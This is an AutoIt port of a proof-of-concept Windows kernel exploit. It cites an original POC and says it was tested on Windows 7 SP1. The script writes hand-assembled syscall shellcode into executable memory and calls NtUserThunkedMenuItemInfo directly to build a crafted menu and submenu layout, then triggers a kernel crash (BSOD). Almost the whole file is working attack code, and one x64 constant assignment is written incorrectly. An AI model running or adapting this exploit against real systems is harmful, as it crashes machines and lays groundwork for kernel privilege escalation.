;~ Original POC : https://github.com/zeroSteiner/mayhem/blob/master/mayhem/exploit/windows.py
;~ Tested on Win7 SP1 (32 and 64bit)
;~ For now it will just BSOD.

#include <GuiConstantsEx.au3>
#include <GuiMenu.au3>
#include <Memory.au3>
#include <ProcessConstants.au3>

Global $hProcess
Global Const $HBMMENU_SYSTEM = 1
Global Const $NtUserThunkedMenuItemInfo = 0x1256

If @AutoITX64 Then NtUserThunkedMenuItemInfo = 0x1098 

$hProcess = _WinAPI_OpenProcess(BitOR($PROCESS_VM_OPERATION, $PROCESS_VM_WRITE, $PROCESS_VM_READ, $PROCESS_CREATE_THREAD), 0, @AutoItPID)

Func Syscall($mi_info, $hMenu, $argArr)
  If Not @AutoItX64 Then
    $sSyscall = '0x'
    $sSyscall &= '5a' ; pop edx
    $sSyscall &= '58' ; pop   eax ; arg0 -> eax
    $sSyscall &= '6a00' ; push  0
    $sSyscall &= '50' ; push  eax
    $sSyscall &= '52' ; push  edx
    $sSyscall &= '83c408' ; add   esp,0x8
    $sSyscall &= 'ba0003fe7f' ; mov   edx,0x7ffe0300
    $sSyscall &= 'ff12' ; call  DWORD PTR [edx]
    $sSyscall &= '83ec08' ; sub   esp,0xc8
    $sSyscall &= '5a' ; pop   edx ; ret -> edx
    $sSyscall &= '83c404' ; add   esp,0x4
    $sSyscall &= '52' ; push  edx
    $sSyscall &= 'c3' ; ret
  Else
    $sSyscall = '0x'
    $sSyscall &= '55' ; push rbp
    $sSyscall &= '4889e5' ; mov   rbp, rsp
    $sSyscall &= '4151' ; push  r9
    $sSyscall &= '4150' ; push  r8
    $sSyscall &= '52' ; push  rdx
    $sSyscall &= '51' ; push  rcx
    $sSyscall &= 'ff7550' ; push  QWORD PTR [rbp+0x50]
    $sSyscall &= 'ff7548' ; push  QWORD PTR [rbp+0x48]
    $sSyscall &= 'ff7540' ; push  QWORD PTR [rbp+0x40]
    $sSyscall &= 'ff7538' ; push  QWORD PTR [rbp+0x38]
    $sSyscall &= '4883ec28' ; sub   rsp, 0x28
    $sSyscall &= '4889c8' ; mov   rax, rcx
    $sSyscall &= '4889d1' ; mov   rcx, rdx
    $sSyscall &= '4c89c2' ; mov   rdx, r8
    $sSyscall &= '4d89c8' ; mov   r8, r9
    $sSyscall &= '4c8b4d30' ; mov   r9, QWORD PTR [rbp+0x30]
    $sSyscall &= '4989ca' ; mov   r10, rcx
    $sSyscall &= '0f05' ; syscall
    $sSyscall &= '4883c448' ; add   rsp, 0x48
    $sSyscall &= '59' ; pop   rcx
    $sSyscall &= '5a' ; pop   rdx
    $sSyscall &= '4158' ; pop   r8
    $sSyscall &= '4159' ; pop   r9
    $sSyscall &= '5d' ; pop   rbp
    $sSyscall &= 'c3' ; ret
  EndIf

  $sBuffer = DllStructCreate("byte[" & BinaryLen($sSyscall) & "]")
  DllStructSetData($sBuffer, 1, $sSyscall)

  $pMem = _MemVirtualAllocEx($hProcess, 0, DllStructGetSize($sBuffer), $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)

  Local $NumberOfBytesWritten
  $sWrite = _WinAPI_WriteProcessMemory($hProcess, $pMem, DllStructGetPtr($sBuffer), DllStructGetSize($sBuffer), $NumberOfBytesWritten)

  $bRet = DllCallAddress("bool:cdecl", $pMem, _
      "int", $NtUserThunkedMenuItemInfo, _
      "handle", $hMenu, _
      "uint", $argArr[0], _
      "bool", $argArr[1], _
      "bool", $argArr[2], _
      "ptr", DllStructGetPtr($mi_info), _
      "ptr", $argArr[3])

  Return $bRet[0]
EndFunc   ;==>Syscall


Func fill_menu($hMenu, $base_wID = 0x1000, $nCount = 6)
  For $i = 0 To $nCount
    ConsoleWrite("[*] adding menu item #" & $i + 1 & @CRLF)
    Sleep(250) ; coz cool ;D
    add_menu_item($hMenu, $i, $base_wID + $i)
  Next
EndFunc   ;==>fill_menu


Func trigger($hMenu, $name, $wID, $n_position, $f_by_position)
  Local $mi_info = DllStructCreate($tagMENUITEMINFO)
  DllStructSetData($mi_info, "Size", DllStructGetSize($mi_info))
  DllStructSetData($mi_info, "Mask", BitOR($MIIM_STRING, $MIIM_ID))
  DllStructSetData($mi_info, "Type", $MFT_STRING)
  DllStructSetData($mi_info, "State", $MFS_ENABLED)
  DllStructSetData($mi_info, "ID", $wID)

  Local $argArr[4]
  $argArr[0] = $n_position
  $argArr[1] = $f_by_position
  $argArr[2] = True
  $argArr[3] = 0
  $status = Syscall($mi_info, $hMenu, $argArr)
EndFunc   ;==>trigger


Func add_menu_item($hMenu, $name, $wID)
  Local $mi_info = DllStructCreate($tagMENUITEMINFO)
  DllStructSetData($mi_info, "Size", DllStructGetSize($mi_info))
  DllStructSetData($mi_info, "Mask", BitOR($MIIM_STRING, $MIIM_ID))
  DllStructSetData($mi_info, "Type", $MFT_STRING)
  DllStructSetData($mi_info, "State", $MFS_ENABLED)
  DllStructSetData($mi_info, "ID", $wID)

  Local $argArr[4]
  $argArr[0] = -1
  $argArr[1] = True
  $argArr[2] = True
  $argArr[3] = 0
  $status = Syscall($mi_info, $hMenu, $argArr)
  ConsoleWrite("    mi_info->wID = 0x" & Hex(Number($wID)) & @CRLF)

EndFunc   ;==>add_menu_item


Func add_submenu_item($hMenu, $name, $wID)
  $hSubMenu = _GUICtrlMenu_CreatePopup()
  $mi_info = DllStructCreate($tagMENUITEMINFO)
  DllStructSetData($mi_info, "Size", DllStructGetSize($mi_info))
  DllStructSetData($mi_info, "Mask", BitOR($MIIM_STRING, $MIIM_SUBMENU, $MIIM_ID, $MIIM_BITMAP))
  DllStructSetData($mi_info, "State", $MFS_ENABLED)
  DllStructSetData($mi_info, "SubMenu", $hSubMenu)
  DllStructSetData($mi_info, "ID", $wID)
  DllStructSetData($mi_info, "TypeData", $name)
  DllStructSetData($mi_info, "BmpItem", $HBMMENU_SYSTEM)

  Local $argArr[4]
  $argArr[0] = 0
  $argArr[1] = False
  $argArr[2] = True
  $argArr[3] = 0
  $status = Syscall($mi_info, $hMenu, $argArr)

  Return $hSubMenu
EndFunc   ;==>add_submenu_item


$hMenu = _GUICtrlMenu_CreateMenu()
ConsoleWrite("[*] h_menu:           " & $hMenu & @CRLF)

$hSubMenu = add_submenu_item($hMenu, 'submenu', 0x0123)
ConsoleWrite("[*] h_submenu:            " & $hSubMenu & @CRLF)

add_menu_item($hSubMenu, 'subsubmenu-item', 0x0001)

fill_menu($hMenu, 0x1001)

ConsoleWrite("[!] Triggering exploit" & @CRLF)
Sleep(500) ; cooooooolesst
trigger($hMenu, 'sploit', 0, 0x0123, False)

; If it ever reaches till this point?
_WinAPI_CloseHandle($hProcess)
